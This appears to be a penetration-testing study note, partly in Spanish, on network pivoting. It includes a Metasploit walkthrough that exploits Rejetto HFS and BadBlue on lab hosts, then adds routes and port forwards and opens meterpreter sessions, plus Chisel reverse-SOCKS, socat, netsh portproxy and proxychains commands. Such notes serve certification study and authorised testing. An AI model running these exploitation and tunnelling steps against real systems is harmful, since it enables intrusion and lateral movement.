# Pivoting in Cybersecurity

## Introduction
Pivoting is an essential technique in the world of cybersecurity that involves moving laterally within a compromised network to access additional systems and resources. This technique is used by security professionals to maintain and expand access across a compromised infrastructure.

## What is Pivoting?
In simple terms, pivoting refers to the action of using a compromised machine as an entry point to access other systems within the network. This technique is particularly useful when access has been gained to a perimeter system and one is looking to infiltrate deeper network segments.

## Types of Pivoting
There are several types of pivoting depending on how the lateral movement is performed:

- **Direct Pivoting:** It is performed from the compromised machine to other systems within the same network.
- **Pivoting Across Jumps:** Involves moving across multiple engaged machines to reach the desired goal.
- **Chain Pivoting:** This involves connecting several compromised systems to reach the target network.
  
## Tools and Techniques
To carry out pivoting, security professionals use specific tools and techniques, such as:

- **SSH Tunneling:** Establish secure connections over SSH to redirect traffic.
- **Proxychains:** Routing traffic through a chain of proxies.
- **Port Forwarding:** Port redirection to access internal services.
- **VPN and Socks:** Use of VPN or SOCKS servers to hide the origin of traffic.

## Importance in Cybersecurity
Pivoting is a crucial skill for security analysts and pentesters, as it allows them to understand the breadth of a breach and assess potential exposure on a compromised network. It also helps identify and remediate potential entry points and lateral movement in future attacks.

## Case Study

![Pivoting](https://github.com/khansiddique/pentesting-repo-notes/blob/main/Images/pivoting.png) 

I personally love this image, it perfectly illustrates what pivoting is about. Based on this image we will have a victim machine with IP 10.4.20.196 and another victim machine with IP 10.4.20.195. The first machine is vulnerable to rejetto_hfs_exec.

```python
Victim Machine 1 : 10.4.20.196
Victim Machine 2 : 10.4.20.195
nmap -sV 10.4.20.196
//tiene una vulnerabilidad en 80/tcp    open  http               HttpFileServer httpd 2.3
use exploit/windows/http/rejetto_hfs_exec
set rhosts 10.4.20.196
ipconfig
//Interface 12 we see the following
IPv4 Address : 10.4.20.196
IPv4 Netmask : 255.255.240.0
//We must establish a route to read other IPs
run autoroute -s 10.4.20.0/20
background (now we save the session)
use auxiliary/scanner/portscan/tcp (to scan ports)
set rhosts 10.4.20.195 (IP target 2)
set PORTS 1-100
run
//we will see something like this
[+] 10.4.20.195:          - 10.4.20.195:80 - TCP OPEN
//we return to the session to do a port forward
session 1
portfwd add -l 1234 -p 80 -r 10.4.20.195 (IP del target 2)
portfwd list (to validate)
//without closing metasploit we execute the following in a terminal
nmap -sV -sS -p 1234 localhost
1234/tcp open  http    BadBlue httpd 2.7
//there is a vulnerability for that
use exploit/windows/http/badblue_passthru
set PAYLOAD windows/meterpreter/bind_tcp
set RHOSTS 10.4.20.195 (target IP 2)
run
background
session
(veremos 2 sesiones !!)
```

## Chisel, Socat and Proxychains

Not to mention everyone’s favorite, it allows you to pivot and move laterally through the network while having control of communications. Chisel is a tool that allows you to create TCP tunnels over HTTP and HTTPS connections. It can be used on both the compromised machine and the attacking machine to establish secure, encrypted communication between them. Chisel is useful for bypassing firewall restrictions and for accessing internal systems from a compromised position. Socat is a multipurpose utility that allows you to create bi-directional connections between two points. It can be used to redirect traffic, modify data in transit, and more. Socat is versatile and adapts to various pivoting needs. Proxychains is a tool that allows you to route connections through a chain of proxy servers. It is especially useful for maintaining anonymity and redirecting traffic through multiple points.

## Chisel

```python
./chisel server --reverse -p 1234 (servidor - tu equipo)
./chisel client 192.168.1.41:1234 R:socks (cliente - víctima)
./chisel client 10.10.0.128:2111 R:8888:socks (segundo cliente - víctima)
```

## Socat

```python
./socat TCP-LISTEN:4343,fork TCP:192.168.1.41:8080
```

## Proxychains

```python
socks5  127.0.0.1 8888
socks5  127.0.0.1 1080
```

## Netsh - Socat on Windows

```python
netsh interface portproxy add v4tov4 listenport=8787 listenaddress=0.0.0.0 connectport=8788 connectaddress=192.168.100.128
```

Keep in mind the following, as you increase the clients with the chisel, the port must go in the proxychains and you put it above the last one you added as shown in the example provided.

## Pivoting with Metasploit

```python
run autoroute -s IP/24 (meterpreter)
route add [destination network] [subnet mask] [session] (metasploit, in case you don't have a meterpreter session)
use auxiliary/server/socks_proxy
socks4 IP 1080 (proxychains)
```

## Interactive console

```python
script /dev/null -c bash
control + z
stty raw -echo; fg
reset xterm
export TERM=xterm
```



## Reference

1. https://github.com/khansiddique/eJPTV2-Notas-Comandos-Cheats/blob/main/EJPTv2/Post%20Exploitation/pivoting.md
2. https://raw.githubusercontent.com/khansiddique/eJPTV2-Notas-Comandos-Cheats/refs/heads/main/EJPTv2/Post%20Exploitation/pivoting.md
3. https://mega.nz/folder/djNgEQaK#SMkGghJ6uA4dStqIypCOQw
4. https://rinku.tech/preparacion-ecpptv2/
5. https://rinku.tech/pivoting-ecpptv2/
6. https://j4ckie0x17.gitbook.io/notes-pentesting/post-explotacion/pivoting
7. https://github.com/jpillora/chisel
8. 

### Youtube
7. https://www.youtube.com/watch?v=Sj6S-9Yij3g&list=PLOaY4Tlt3Xl6-myN33dE4v7f9vNwS9Vdl&index=2
8. https://www.youtube.com/watch?v=zGm7kUvC31M&list=PLOaY4Tlt3Xl6-myN33dE4v7f9vNwS9Vdl&index=4
